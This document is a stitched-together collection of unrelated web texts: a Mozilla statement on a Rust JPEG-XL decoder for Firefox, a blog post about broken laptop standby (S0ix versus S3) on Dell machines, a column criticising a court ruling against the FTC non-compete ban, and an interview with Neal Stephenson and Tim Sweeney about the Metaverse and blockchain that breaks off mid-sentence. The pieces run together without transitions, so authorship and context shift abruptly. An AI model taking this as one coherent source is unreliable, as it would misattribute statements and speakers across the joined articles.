      <p dir="auto">Over the past few months, we’ve had some productive conversations with the JPEG-XL team at Google Research around the future of the format in Firefox. Our primary concern has long been the increased attack surface of the reference decoder (currently behind a pref in Firefox Nightly), which weighs in at more than 100,000 lines of multithreaded C++. To address this concern, the team at Google has agreed to apply their subject matter expertise to build a safe, performant, compact, and compatible JPEG-XL decoder in Rust, and integrate this decoder into Firefox. If they successfully contribute an implementation that satisfies these properties and meets our normal production requirements, we would ship it.</p>
<p dir="auto">Time will tell whether the format succeeds in becoming a universal JPEG replacement in the way some folks hope. In the event that it does, it would be unfortunate to potentially introduce memory safety vulnerabilities across the myriad of applications that would eventually need to support it. A safe, fast, and battle-tested Rust decoder from the original team could make that scenario much less likely, and so we’re using our leverage to encourage progress on this front.</p>

<p>In this article, I aim to take a different approach.
We will begin by defining a laptop according to my understanding.
The I will share my personal history and journey to this point, as well as my current situation with my home and work
laptops.
Using this perspective, we will explore the current dysfunctionality of the standby function in modern laptops, followed
by a discussion of why this feature still has relevance and right to exist.
Finally, we will draw conclusions on what we can learn and take away from this.</p>
<h2 id="my-definition-of-a-laptop" tabindex="-1">My Definition of a Laptop <a href="#my-definition-of-a-laptop">#</a></h2>
<p>It is a straightforward concept: a laptop, being a portable computer, should allow for easy use wherever one goes.
It is a machine that can be taken along while working, then by closing the lid put to sleep for later use.
At a later time, it should allow you to pick up where you left off.</p>
<p>However, in recent times, achieving this seemingly straightforward goal has become increasingly difficult to achieve.
If you find this hard to believe, stay tuned for more.</p>
<h2 id="my-situation-and-point-of-view" tabindex="-1">My Situation and Point of View <a href="#my-situation-and-point-of-view">#</a></h2>
<p>So, without further ado, let me begin by laying out my perspective.<br>
Throughout my professional and educational career, I have used a wide range of servers, desktops and laptops.
In my first semester at university, I began using Linux exclusively on my laptops.<br>
I was fortunate to own a Lenovo Thinkpad E470 during that period, which offered excellent Linux support.
However, this decision has had a major impact on my choice of laptops in the future.<br>
Linux support for specific components was substandard back then and remains so today.
As of today, Network Cards and dedicated Graphics Cards in Combination with internal ones (e.g. Nvidia Optimus) remain
the typical pain points.
But issues such as the requirement for complex drivers due to the current "Windows Hello"-certified IR webcams and array
microphones were not present in the past.</p>
<p>Therefore, as Lenovo was consistently praised for their exceptional Linux support, I continued purchasing their
Thinkpads such as the X240 or X380.
I only made minor adjustments, such as switching out the Wifi-NIC for an inexpensive Intel one.
My previous laptops were adequately powered Linux machines, which were reliable wherever I went.</p>
<p>My first work laptop, the Dell XPS 15 9570, was a continuation of this trend.
Despite encountering a minor obstacle regarding the proprietary fingerprint reader, which required non-existent
proprietary drivers, everything functioned seamlessly.
With more time spent on the road and working from home due to Covid, than at a docking station in the office, I have
certainly enjoyed the smooth, pain-free experience.</p>
<p>As I currently have another XPS 15 9570 for personal use, I can confirm that S3 is still supported at the time of
writing.
This is evident from the command output below, indicated by [deep].[2]</p>
<pre tabindex="0"><code>$ <span>cat</span> /sys/power/mem_sleep

s2idle <span>[</span>deep<span>]</span></code></pre>
<p>Another non-existent issue were sleep problems.
Until they hit me at the moment i received my new Work-Laptop, which was a Dell XPS 15 9500.
Let me clarify - the sleep issues are not linked to Linux and continue to occur even with my current Dell XPS 17 9720.</p>
<h2 id="the-status-quo" tabindex="-1">The Status Quo <a href="#the-status-quo">#</a></h2>
<p>What happened and why?<br>
At first glance, it seems quite simple.
For the past decade, Microsoft has been forcing the migration from S3 standby to S0 "modern standby".</p>
<p>However, there's more to this than meets the eye.
There are two questions to answer.</p>
<ul>
<li>What is modern standby and how is it implemented?</li>
<li>Why did Microsoft force the migration to "modern Standby" if it breaks standby?</li>
</ul>
<h3 id="the-technical-aspects" tabindex="-1">The technical Aspects <a href="#the-technical-aspects">#</a></h3>
<p>Traditional Sleep requires all system hardware and software components to work together.
The operating system must support Sleep, as well as the hardware (e.g. CPU) and the BIOS/UEFI.
According to the UEFI to Hardware Interface Standard (ACPI), this usual form of sleep is referred to as S3.
S3 is a Sleep State in which all system components, except for the RAM and CPU Cache, are powered off.[4]
This is a good compromise between power consumption and the time required to resume from sleep.
However, it is important to note that the CPU is completely powered off.</p>
<p>Microsoft began rolling out "Modern Standby" (or S0ix) in 2012, with the ultimate goal of replacing S3 sleep.
The aim is to provide similar or improved energy savings to those of S3.
However, unlike S3, S0ix keeps the CPU and necessary system components active.
S0ix sets the CPU to a low-power idle state to reduce power usage when not in operation.</p>
<p>But why is my CPU being used when sleeping?<br>
This is where the "modern" aspect of "modern sleep" comes into play.
With the rise of smartphones and tablets, we have become accustomed to waking up quickly to get notifications, download updates or activate voice assistant services.
Microsoft aims to replicate this functionality with S0ix.[1]
Your computer should be able to allow for the usage of <em>Cortana</em> and receive Windows Updates during Sleep mode, among other features.</p>
<p>This introduction of functionality during sleep state, is the reason why Microsoft describes S3 as "Legacy Sleep".[1]
Our story would end at this point if it weren't for the complications that arise from S0ix, as indicated previously.</p>
<h3 id="the-problems" tabindex="-1">The Problems <a href="#the-problems">#</a></h3>
<p>S0ix would be great if it worked.
But unfortunately it does not - laptops die from overheating, draining their battery in the process.[1]</p>
<p>This issue is not limited to Linux, as Dell officially warns to power down your Laptop before placing it in a backpack.[7]
Which brings us back to my Definition of a Laptop from above.
This kind of defies the purpose of a Laptop in my opinion.</p>
<p>So as Microsoft themselves enforced S0ix upon us and Intel states compatibility, the cause of our problems must be the manufacturers!<br>
But Microsoft Surface Devices suffer from the same overheating and battery drain issues as well.[8]</p>
<p>It seems that even more than a decade after the migration away from legacy sleep started, there is still work left to do, smoothing out even the roughest edges.
And due to the involvement of many system components, the fixes need to be applied in the OS/Kernel, ACPI/UEFI, CPU from every vendor along the chain.</p>
<p>But we can still use S3 sleep, can we?<br>
This is the biggest bummer in my opinion, with the migration to S0ix Laptop manufacturers have began deprecating S3.
This has lead to them stopping to fix bugs and retain functionality.[2]
In the case of Dell, this has straight up lead to the complete removal of S3 from the UEFI.[3]</p>
<p>So now we have non-portable Laptops with broken S0ix and removed or broken S3.</p>
<h2 id="takeaway" tabindex="-1">Takeaway <a href="#takeaway">#</a></h2>
<p>We can only achieve advancement in regards to Sleep by adopting a new Standard which promises great features.
Therefore we need a supporter with huge market influence that can bring a potential standard to the market.
This definitely works in regard to Microsoft and i wholeheartedly support their chase of improvements.
Their aim with S0ix is relatable and can somewhat be compared to Apples move to force USB-C on everyone - which is great and a necessity to be done by a market leader.
But in Contrast, Apple kept the legacy Lightning and even brought back Magsafe (and if it only were to milk the cashcow).</p>
<p>All in All the current situation is unfeasible.
I am not certain if the current problems are related to the Limitations of x86 in comparison to ARM (A potential article could explore those).
But i can not accept a Laptop that constantly dies from overheating or greets me with a drained battery in a working environment.</p>
<p>Fortunately, S3 is still supported by CPU and some Laptop Manufacturers.
Therefore Consumers have the option to state their disapproval with the current state of S0ix by buying Laptops that still support S3.</p>

	<h2>
		For a brief moment, it appeared employees would no longer be locked into jobs with arbitrary, non-compete contracts. But a recent court decision has workers back in non-compete jail. 	</h2>
	
</div>					
						<div id="remove_no_follow">
		<div>




<p>I hate non-compete contracts — and I’m not alone. They restrict workers’ ability to move from job to job, which in turn reduces salaries. The only way I ever got a significant raise during my career was when I changed employers. So, when the US&nbsp;<a href="https://www.computerworld.com/article/2095092/the-end-of-non-compete-agreements-is-a-tech-job-earthquake.html">Federal Trade Commission (FTC) banned non-compete agreements</a>, I, and a few million employees, were pleased as punch.&nbsp;</p>



<p>That happiness was brief. Before the ban could even take effect on Sept. 4 (two days after Labor Day in the US), District Court Judge Ada Brown in Dallas stopped the&nbsp;<a href="https://www.cio.com/article/3489838/federal-judge-strikes-down-ftcs-ban-on-non-compete-agreements.html" target="_blank">FTC from enforcing it</a>, saying the move “exceeded its statutory authority,” was “arbitrary and capricious” and would have caused businesses “irreparable harm.”&nbsp;</p>



<p>Yeah. Right.&nbsp;</p>
</div> <!-- Closing grid grid--cols-10@md grid--cols-8@lg article-column0 -->
								
					<div>


<p>I’ve been an employee, a freelancer, and I’ve owned small businesses. Non-compete agreements have only hurt me in the first two cases, and I never found a reason as a boss for requiring my employees to sign a non-compete contract clause.</p>






<p>I know there are times when these agreements do make sense. If I invented a better mouse trap, I wouldn’t want my engineers taking the cheese to rival Acme Giant Mouse Trap Inc.&nbsp;&nbsp;But more often than not, the non-compete clauses I’ve seen are just there to trap employees.&nbsp;&nbsp;</p>



<p>You might think these things are only a pain for people like me who work in the tech and creative space. You’d be wrong.&nbsp;<a href="https://www.acslaw.org/issue_brief/briefs-landing/no-exit-understanding-employee-non-competes-and-identifying-best-practices-to-limit-their-overuse/" target="_blank" rel="noreferrer noopener">Employees also locked into their jobs</a>&nbsp;include hairdressers, janitors, security guards, and fast-food workers. Who knew that the ability to say, “Would you like fries with that?” was proprietary? Not me.</p>
</div> <!-- Closing grid grid--cols-10@md grid--cols-8@lg article-column1 -->
								
					<div>


<p>Altogether, the FTC estimated that the ban could increase workers’ earnings by at least $400 billion over the next decade, affecting about 30 million American workers. It was a nice dream while it lasted.&nbsp;</p>



<p>Essentially, Brown ruled that the federal agency lacked the statutory authority to enact such a sweeping ban and violated the US Administrative Procedures Act. She&nbsp;&nbsp;emphasized that Congress or individual states, not federal agencies, are the organizations that can regulate non-compete agreements.</p>



<p>This is all part of an overriding conservative legal argument that federal agencies have minimal powers. That wasn’t always the case.</p>
</div> <!-- Closing grid grid--cols-10@md grid--cols-8@lg article-column2 -->
								
					<div>


<p>For decades, a Supreme Court ruling in the 1984 case, <a href="https://www.hklaw.com/en/insights/publications/2024/05/us-supreme-court-may-soon-discard-or-modify-chevron-deference">Natural&nbsp;Resources Defense Council</a>, required federal courts to defer to an agency’s reasonable interpretation of an ambiguous statute that the agency was tasked with administering. This became known as the Chevron Doctrine.&nbsp;</p>



<p>I favored Chevron because, while I’m no lawyer, I know enough about regulatory law to know that the “law” usually only offers general guidelines on difficult, detailed issues. If you think, for example, your average Congresscritter has a clue about how, say,&nbsp;<a href="https://www.zdnet.com/home-and-office/networking/net-neutrality-what-it-is-and-why-were-talking-about-it-again/" target="_blank" rel="noreferrer noopener">net neutrality</a>&nbsp;really works, think again. The Federal Communications Commission (FCC) and FTC have the experts to nail the specifics; Congress doesn’t — and neither does your state legislature.&nbsp;</p>



<p>Unfortunately, the Trump-appointee-dominated Supreme Court trashed Chevron with this year’s&nbsp;<a href="https://www.scotusblog.com/case-files/cases/loper-bright-enterprises-v-raimondo/" target="_blank" rel="noreferrer noopener">Loper Bright</a> decision. And it doesn’t put the ball back in Congress’s court to make incredibly detailed laws. As the&nbsp;<a href="https://www.clearygottlieb.com/" target="_blank" rel="noreferrer noopener">Cleary Gottlieb</a>&nbsp;law firm put it, it’s now up to “<a href="https://www.clearygottlieb.com/news-and-insights/publication-listing/after-chevron-what-the-supreme-courts-loper-bright-decision-changed-and-what-it-didnt" target="_blank" rel="noreferrer noopener">federal courts to draw their own conclusions</a>&nbsp;about the correct legal interpretation of otherwise ambiguous federal statutes.”</p>
</div> <!-- Closing grid grid--cols-10@md grid--cols-8@lg article-column3 -->
								
					<div>


<p>Oh boy, judges will now get the final say on setting detailed policy. I’m thrilled. This is just another chapter in the ongoing debate over the balance of power between federal agencies and the judiciary. Given how the courts, especially the Supreme Court, have been ruling lately, I’m not a happy camper.&nbsp;&nbsp;</p>



<p>The FTC isn’t happy, either. I expect it will appeal. (I don’t have high hopes for their chances with the current Supreme Court.) In any case, the FTC will continue to address non-compete agreements through case-by-case enforcement actions. The chances it will have much success are slim, but we live in hope.&nbsp;</p>



<p>While the FTC contemplates its next steps, businesses and employees remain in a state of limbo regarding the fate of non-compete agreements. I expect businesses will hang on to their agreements until the FTC or the courts pry their cold dead fingers off them.&nbsp;</p>
</div> <!-- Closing grid grid--cols-10@md grid--cols-8@lg article-column4 -->
								
					<div>


<p>Non-compete deals, like their mirror “<a href="https://www.ncsl.org/labor-and-employment/at-will-employment-overview" target="_blank" rel="noreferrer noopener">at-will employment laws,</a>&nbsp;which give companies the right to fire employees for no reason whatsoever except for a few specific situations, put all the power in employers’ hands. It’s not fair, and it’s not right. Workers deserve the right to get the best possible deal for their labor and some semblance of job security.&nbsp;</p>



<p>Is that too much to ask for? It appears that in the United States, at least for now, it is.&nbsp;</p>

  <p><strong>Ball: Let's start at the foundation. Neal, how do you define the Metaverse in 2024?</strong></p><p><strong>Stephenson: </strong>A massively multiplayer online universe that has a sense of space to it so that there are experiences distributed around that space in a way that is perceived by all of its users in the same way. And you can move around from one place to another and interact with other users who are not physically present. It’s not controlled by any one entity; many creators, large and small, build things there.</p><p><strong>Ball: How about you, Tim? What comes to mind when you think of the word Metaverse?</strong></p><p><strong>Sweeney: </strong>Well, Neal invented the word, and so I would defer to him on that. But I will just observe that we've seen games trending in the direction of that definition for a very long time and becoming more and more close to not only Neal's definition, but kind of the spirit of what Neal wrote in <em>Snow Crash</em> and other novels. And this is what makes it timely and interesting to Epic.</p><p><strong>Ball: For many people, the word Metaverse brings to mind (if not outright requires) virtual reality goggles and augmented reality glasses. From your perspective and the Epic perspective, how central, critical, or relevant overall are goggles or glasses to the vision of the Metaverse?</strong></p><p><strong>Sweeney: </strong>Well, I think this is happening now and you don't need new hardware to experience it. Hardware getting better over time and more powerful will enhance it for sure. I think what we're seeing emerge now is to some extent, inevitable, right? As soon as people invented microelectronics, a few years later people started making video games out of parts. And as computers and consoles took off, games grew in their capabilities and then the internet came along and gaming became multiplayer. I think what we're really seeing is the inevitable evolution of gaming to take advantage of all the new capabilities that people are learning of and discovering every year.</p><p>And when we talk about the Metaverse, it's a word that kind of has a stock price. When we release something cool, it goes up and when we release something that's not cool, it goes down, but it's very much not any one company defining this. Rather we're all building towards this ideal that we and all of the players in the world are talking about and debating and discussing, and we're figuring out what it is as we go and figuring out the nuances of what makes it work and what makes it really awesome and fun.</p><p><strong>Ball: Neal you've spoken about your changing perspective on the criticality of head-mounted displays relating to the Metaverse. What's your perspective in 2024?</strong></p><p><strong>Stephenson: </strong>My overarching answer is that the actual market and actual users find ways to do things that we don't necessarily imagine in advance, just with our own limited perspective. And so cyberpunk had a whole aesthetic about it and still does, which to a large extent, revolved around having cool shit on your face. Mirror shades. Actually, one of the original anthologies of cyberpunk fiction was called Mirror Shades. And it was easy to assume back then that in order to truly experience a three-dimensional environment in an immersive way that you needed stereoscopy, you needed to have a different image slightly in each eyeball to give you a fully three-dimensional effect.</p><p>And so there's always been this linkage in people's minds between cyberspace, the Metaverse, and goggles. What we've learned is way more nuanced and interesting than that. The year after <em>Snow Crash</em> came out was when <em>Doom</em> was released, and <em>Doom</em> is the ancestor of all games that are set in immersive environments [Note: Tim is nodding]. And it didn't require stereoscopy. It was all in a screen - very low resolution by current standards - and yet, the magic of the illusion was that you were running around in this three-dimensional persistent environment. And then since then, that kind of experience has only gotten better. And in the meantime, we've been learning things about goggles, about headsets and what they are and are not good at. And it took a long time for them to get to the point where [input/output] lag was acceptable. And so there's kind of this long period of time during which video games on screens were getting much, much, much better, but the acceptance of headsets was [falling] behind, because if lag is bad, you're more prone to get sick.</p><p>One of the things that I became aware of when I was working at Magic Leap on AR headsets is that stereoscopy isn't enough. That your brain actually uses a lot of other cues other than stereoscopy to build a map of the three-dimensional world around you. And so people with one eye, one-eyed people can still perceive three-dimensionality, for example, because of these other mechanisms.</p><p>This is a kind of a long-winded way of saying that the reality we've ended up with, which didn't seem plausible in 1990 when I was writing [<em>Snow Crash</em>], is that we've got billions of people fluently navigating highly realistic, immersive, three-dimensional worlds using flat screens and keyboard and mouse.</p><p><strong>Ball: So I want to use this to jump into a related question. Since Meta's name change in 2021, there have been a number of different eulogies for the Metaverse. And so I have to ask the question starting with you, Tim, what's your perspective on the suggestion that the Metaverse is dead, duly rejected by consumers, and long since buried?</strong></p><p><strong>Sweeney: </strong>Well, I think what's been rejected is a particular vision of the Metaverse, which is people putting on VR headsets and going to the office and working with co-workers in this Silicon Valley chic art style, that was just totally lame and was never going to succeed. But on the other hand, if you look at what people are doing with their time in video games. <em>Fortnite</em> and <em>Roblox</em> and other immersive games like <em>PUBG Mobile</em> are growing at an amazing rate. People are playing them, enjoying them. You can identify now about 800 million people who engage in these kinds of experiences every month. And what they're doing is very Metaverse. They're going into a real-time, 3D environment with their friends. They're engaging in a variety of different experiences.</p><p>In <em>Fortnite</em> alone, the time is [mostly in] Battle Royale, but there are other user created things too, and other Epic created things which are consuming more and more of a fraction of people's time, and they really are traveling through virtual worlds together socially and having fun together. And it is becoming, in many ways, a new medium that is qualitatively different than the multiplayer games of the older eras like <em>Doom</em> or <em>Ultima Online</em>. What's happening now is different. Being there in 3D emoting and voice chat is, to me, that's the version of the Metaverse that's actually working. And when a company does something lame and people say "The Metaverse.... it's failed." &nbsp;No, a developer, perhaps us sometimes, just did something that was lame and that particular thing failed. But the idea goes on.</p><p>And I think overall, it's inevitable that gaming becomes more and more like this, more socially connected, more interconnected with many creators participating and what you're experiencing, and a faster number of people participating so that the internet itself or the social networks, it eventually becomes ubiquitous and everybody's there. So I think in terms of actual use and actual engagement, [the Metaverse] is going stronger than ever before, definitely stronger than last year and stronger than the year before that. And it's on the growth. But when companies try lame stuff, it's rejected however strong the reputation of the company is.</p><p><strong>Ball: So Tim's talking about lame stuff often being publicly associated with the Metaverse. Neal, I think another common association with this dystopia. That the concept of the Metaverse is inherently dystopic, or if it's not, the book that it comes from is considered dystopic. You're responsible for both. What's your perspective? Is it an inherently dystopic concept? Is that what you were trying to communicate in the book?</strong></p><p><strong>Stephenson:</strong> By the time I wrote <em>Snow Crash</em>, the dystopian elements of cyberpunk had already become so familiar and kind of shopworn that it was already a little bit of a cliche, so I didn't feel as though I could just write another one of those with a straight face. So <em>Snow Crash</em> is both a dystopian novel in some ways and a parody of the tropes of dystopian novels [Note: Tim is nodding]. It tries to be funny, which was a thing that alarmed and disconcerted some readers at the time; they didn't know what to make of that. We could get into a whole question of whether basically stable civilization of people living mostly in comfortable burbclaves is more or less dystopian than a post apocalyptic wasteland or something like that.</p><p>But I'll concede the point that that world [of <em>Snow Crash</em>] has got dystopian stuff in it. The Metaverse as shown in the book, is really neither dystopian nor utopian. It's just a communications medium that different people use in different ways. When we first see it, we're seeing kind of the schlockiest, most mass market version of it with intrusive advertisements and kind of garish lowest common denominator content. But as we get into the book, we see people using it in much more interesting ways. We see characters who've gone to a great deal of effort to build exquisite environments that they enjoy being in. We see the kind of library environment where the librarian is curating a huge storehouse of ancient information. And so I think it's possible for all of those things to be true at once, and that already we can see examples of all of those different styles of usage in the Metaverse as it's coming into existence today.</p><p><strong>Ball: So October 28th, 2021, Facebook announces it's changing its name to Meta. What did you think Neal? What was your instant response that day and a month later?</strong></p><p><strong>Stephenson: </strong>Well, I was working and I have a hobby of machining, so I was working in a machine shop on something and my phone buzzed, and it was a text message from John Gaeta, who I worked with at Magic Leap [Note: Gaeta is also a visual effects designer and inventor, and partly credited with creating Bullet Time, which won him an Oscar]. And he just sent me a text message saying, "I'm sorry for your loss." And so, I had no idea what he was talking about, and I thought, oh, some friend of his must have experienced a death in the family and he's trying to send condolences to this person but he hit the wrong button and he sent it to the wrong guy. And so I better tell John that his message didn't reach the intended recipient. So I'm sort of thumbing that out, and knowing John with a little bit of a mischievous streak, maybe I better do some Googling and catch up on current events. So that was when I became aware of the name change and understood the true meaning of John's message.</p><p>And then within 48 hours, other huge companies like Microsoft, and I think Google had also come out and said, "Oh, yeah, yeah, we are Metaverse companies too," because I think they wanted to prevent a competitor from establishing a lock on that name. And then a million smaller companies came in the wake of that saying, "Oh, well, if the next big thing is the Metaverse thing, we are now Metaverse companies." A year and a half later, they'd be calling themselves AI companies. So I just tried to take it with a little bit of a sense of humor, and as time went on, I looked for ways to see if I could create anything sustainable out of that whole scene. So that's how I ended up, for example, talking to Marc Petit [then VP and GM of Unreal Engine at Epic Games] and Patrick Cozzi [CEO/Founder of Cesium], who had been working on the idea of a decentralized open Metaverse, and I continue to be in touch with them, and have co-founded Lamina1, which is a company dedicated to building infrastructure for a decentralized open Metaverse, and building a thing called Whenere, which is the place that I would want to visit in the Metaverse.</p><p>So I just think that's the best way to deal with all that is to try to make use of the notoriety while it lasted to create some things that were sustainable. I knew that a year later there would be another fad that would knock Metaverse off the stage and become the new hot thing in tech.</p><p><strong>Ball: Neal, do you ever consider doing a sequel to <em>Snow Crash</em>? You've done sequels to a few of your books, some have been planned as multi-part entries. Is there a <em>Snow Crash</em> 2 that ever seeps into your mind?</strong></p><p><strong>Stephenson: </strong>Actually, over the last couple of years I've produced a bunch of material that I call the Extended <em>Snow Crash</em> Universe timeline, which places the events of <em>Snow Crash</em> into a specific date on the calendar, and then there's sequel and prequel material connected with that. And some of it's filling in backstory. There's this character named Lagos in the book who's an interesting guy, but we don't quite ever hear how he got involved in all this. So I've got his backstory all worked out in detail. And I also created another place in the Metaverse called Vertex4 which is more more geared towards interactive. The Black Sun and everything you read about in the book is very much, it's suitable for use in a work of written fiction. It's not actually that transferable to an interactive experience. So yeah, there's not a sequel in the sense of a written book, but there's sequel and prequel material that may break the surface in various formats as we go along.</p><p><strong>Ball: Tim, in the past you've pointed to code from the very first Unreal Tournament in 1997, making the argument that you and the company have had Metaverse ambitions for quite some time. And I know that you've been speaking about the Metaverse for at least 15 years publicly, long before the hype. I'd love to understand why do you want to build the Metaverse? Is that Epic's overarching ambition or is that just one of many goals?</strong></p><p><strong>Sweeney: </strong>I think this is the inevitable future of real-time 3D in gaming. It became apparent in the very early days of computers for me. We used to dial into bulletin boards with modems before we had the open internet and played a multi-user dungeon game and a text mode game where you joined a Unix server that was serving a dozen people at a time and you'd type commands and go from place to place. But you realized there are other people in this world and you could go up, you can have conversations with them in the world, but you could also engage in gameplay. And that was around 1985 or so.</p><p>It became apparent at that point that this was going to be the future of gaming, and that as computers became more capable and connectivity improved and graphics capabilities grew, we'd get multiplayer games where the social element would be by far the most compelling games. And it's taken a very long time to get to that point.</p>

  <p>From then to the first Unreal game being released was 12 years. But subsequent capabilities have taken a very long time. Ubiquitous internet connectivity of the form that can support a real-time 3D simulation at quality is a problem that took decades to solve. Being able to draw a world as realistic as the <em>Fortnite</em> Battle Royale world with 100 players participating in a simulation together took decades. There was an entire genre of games in Battle Royale that you couldn't have built a decade earlier. The technology just wasn't capable and the computers were just not fast enough.</p><p>And so a large part of this has been building up our part of civilization's technology tree, building up all of the real-time 3D features and building up all of the simulation features that are needed to run these sorts of universes. And seeing at the same time, people's expectations of the world are changing. We had the internet long before we had social networks. We had social networks long before people began joining these games and hanging out with their friends in real time 3D and voice chatting as we do now. And as each new tier of capabilities came online, we've been getting closer and closer. And I think we can finally see in <em>Fortnite</em> and <em>Roblox</em> and a few other experiences, all of the elements of the Metaverse in place, but in a very early and limited form. You see a creator tool set that's increasingly powerful like the <em>Unreal Editor for Fortnite</em> (UEFN) where people can build their own content. Over the next few years it’s going to approach the levels of AAA game development capabilities.</p><p>You have very realistic 3D graphics capabilities. You have the ability to take content that's been built for movies, take blueprints and schematics of cars that have been built for production and then bring them into real time 3D and have them work as functioning objects. And so the convergence of all these different 3D content pipelines from different industries into real time 3D, into <em>Fortnite</em>, as we've done with so many of our crossovers, is really starting to show that there's not just a bunch of games out there. There is an entire universe in which all of the world's cool ideas and brands and creators connect together into a single space and can build anything far beyond previously envisioned limits. It is going to evolve at a far faster pace than any one company could ever build anything, because there's going to be hundreds of thousands of creators each contributing their art and their code and their ideas to it, and all the world's major brands contributing their IP and their ideas and their support to it. And it's going to take on a life of its own and really quickly transcend what it is today. It's become very clear over the past few years that we're in this steep growth curve that's being driven by that. </p><p>Though there are some structural impediments in the way, for example Apple blocking <em>Fortnite</em> and blocking different development practices that are going to be absolutely necessary to create the Metaverse, the legal and technical problems are being addressed. </p><p>This medium is emerging at an astonishing rate, and I think people have no idea how awesome it's going to be by the end of this decade. But when you look at all the best capabilities of the top game engines, look at all the work being created for top movies in the film industry, all the work of all the car makers and of all the other storytellers and creators of all different kinds of games, and envision what the world is like when all of that comes together into a socially connected united economy which everybody can participate in, that's going to be a whole new world. And that's what we're very excited about.</p><p>But nobody had any clear vision of this in the 1980s, but it was obvious at that point in 1985, that the world was heading in this general direction. And for the past 33 years of Epic's history, we've been marching in this direction, figuring out exactly what the direction is as we go, but we are learning every step of the way and getting closer and closer.</p><p><strong>Stephenson: </strong>For people who never saw a <a href="https://en.wikipedia.org/wiki/Multi-user_dungeon">MUD</a> [Multi-User Dungeon], to roll the clock back a few decades, the thing about that that was mind-blowing at the time was that it's the simplest possible ASCII teletype interface, but when you were moving around that dungeon and you were in a particular location in the dungeon, if there was another player in the same location, then the system knew that, and there might be some form of interaction that could happen at that point. And as simple as it was, that was the thing that just completely blew everybody's mind. It's really the basis for anything that's happened since then in a metaverse-y kind of development path.</p>

  <p><strong>Ball: So when I was writing this book, I was reading a bunch of Richard Bartle's old published works, and he had reported on a statistic that I thought was remarkable, which was as late as 1993, a full 10% of all global internet traffic was just for MUDs.</strong></p><p><strong>Sweeney: </strong>That was to the point where you realized that the graphics can help the experience, but they're not essential. Our brains are willing to fill in massive amounts of detail. In my memory of reading <em>Snow Crash</em>, I actually see images of it though it was just a book. From the early MUDs to playing <em>Doom</em> with 320 by 200 pixels of real estate on the screen, my memories of are in fully formed photorealistic fashion. And I think that's the big lesson that we don't need hardware that plugs into our brain and creates a sense of immersion that's indistinguishable from reality. What we can do with just the devices right in front of us is totally not the limiting factor now.</p><p><strong>Ball: Neal, I'd love to get a little bit deeper into Lamina1. You co-founded it in 2022 with one of your colleagues from Magic Leap, Rebecca Barkin. Can you explain what Lamina1 is, how it works, what it's trying to do, and its criticality to the Metaverse as you imagine it?</strong></p><p><strong>Stephenson: </strong>If we're going to have a Metaverse that millions of people use, we need to have experiences there that people enjoy having, which seemed like kind of a obvious statement to make, especially in present company. But the people who know how to make those experiences are the creators who by and large are employed in the video game industry or more and more in the motion picture and TV industry. They're the people who know how to run game engines and who know how to run the tool chains that feed assets into those engines. So the question is, what's the revenue model that allows those people to get paid? And there's various answers to that question. We have conventional payment systems that work, but in our minds, there was an overlap there with some of the qualities and capabilities of blockchain systems. And so Lamina1s a new chain that's optimized to help creators build things, to help them get paid for building things and creating experiences or components of new experiences in an open Metaverse.</p><p><strong>Ball: Crypto has become one of those more controversial elements among Metaverse aficionados. There are those who are ardent believer's in blockchain technology's criticality to the Metaverse. You have those who are entirely skeptical about the technology, not just unconvinced of its relevance. And then comparatively few people in the middle who largely say, "not sure; we'll see." What in your mind makes blockchain such a viable, helpful, if not essential technology for building an open Metaverse?</strong></p><p><strong>Stephenson: </strong>I think a lot of the skepticism and hostility that we've seen, particularly in the game development industry, just comes from this clash of mindsets between people who are strongly ideologically motivated coming out of a libertarian crypto kind of mentality, versus the people who build these experiences and who actually understand how game engines work. And there's a dream of interoperability, which is the idea that you could essentially drag and drop assets from one game into another, which is quite reasonably seen as threatening and even kind of insulting to people who spend their lives crafting beautiful AAA games. And it's also technically ridiculous. If you actually understand how these things work, you can't just take an asset from one game and somehow drop it into another. So I think that it is possible to engineer new experiences from the ground up that are designed to support interoperability and that there's some overlap between what that is going to look like and the kinds of payment systems that you can construct, and the more importantly, the smart contract systems that you can construct on top of blockchains.</p><p>For me, money is kind of the least interesting of applications on blockchains. It's the one that's gotten the most attention because they were mostly started as financial instruments. But with the rise of NFTs, we saw this idea that you could essentially put pieces of art up on a chain. And what was then discovered was that the smart contracts that governed these NFTs weren't smart, and they weren't contracts. They actually weren't enforceable. And so some work has been going on in the last couple of years to bring the NFT market into the realm of legal enforceability. The late Josh Kramer at Grapevine developed some technology in this area, but unfortunately passed away last fall. Mattereum is a company in the UK that's building royalty systems based on legitimate UK law.</p><p>And our friends at Shrapnel have been developing an actual running AAA game that embodies some of the features I'm talking about, where creators can post things on a chain that establish a kind of chain of IP development, IP ownership that's traceable, and that should in theory, allow them to get rewarded economically if their stuff succeeds. So that's I guess kind of the quick overview of a really complicated topic.</p><p><strong>Ball: Tim, I'm curious about your perspective on blockchain technologies.</strong></p><p><strong>Sweeney: </strong>The underlying idea of blockchains is awesome nerd technology. There's great use of cryptography, great protocols for distributed agreement on events, and a really interesting foundation for the future of distributed computing systems of all sorts, including the Metaverse. It strikes me as very unfortunate that it didn't have another couple decades to be nurtured in the purely nerd community before it was adopted as a financial instrument, because the currency has been greatly undermined by speculation and scams and regulatory uncertainty and so on. And I feel like it's a very unfortunate artifact of this decade. But in the future, the ideas from various blockchains such as zero knowledge proofs, the idea of cryptographic consensus protocols and so on, should be a key component of a lot of systems. And if we would only stop clawing the money and stop building financial scams around them, then they could be a great part of a future society.</p><p>I think that it takes a lot of discipline in the minds of technologists to separate the good from the bad of crypto. There is actually a great deal of good in the technology, separate from the bad uses of it that we've seen over the past, and I think we should be open-minded to the learnings to be made from there. Perhaps in a decade or two, we'll look back and be like comparing the cryptocurrency period we went through now to the 1990s dot-com crash. Underneath all of that, the internet was really solid technology and there were some companies built up in that timeframe, like Amazon actually did extremely well and thrived, but there are also scams layered on top of it. But the world recovered from that and is doing great now. And I think the world will end up on the right side of blockchain technology in the long-term future. And in the meantime, it's still a rather wild west so buyer beware. </p><p>I think the future of the Metaverse has to be built on open protocols, open standards and interoperability of all forms. We need both technological interoperability so that any creator, any hosting provider, any ecosystem operator, any brand and any content can interoperate freely without being forced into any one company's walled garden of any sorts. And this isn't really even an attempt to paint a utopian picture, but just that there are going to be lots of places in the Metaverse and a lot of these places will be owned by companies, but we mustn't allow any one company to dominate or control the thing overall. And this both goes for the underlying technology and standards, but also for commerce and notions of ownership and economic interoperability in the Metaverse.</p><p>When we designed the <em>Fortnite</em> Creator Economy 2.0, the key principle is realizing there are two things happening in the <em>Fortnite</em> economy. There is value being created through engagement, people building fun experiences. Third-party creators as well as their own teams are creating value engaging players. And because players are engaging and are happy, they're spending money in the Item Shop. And so the key became to share the 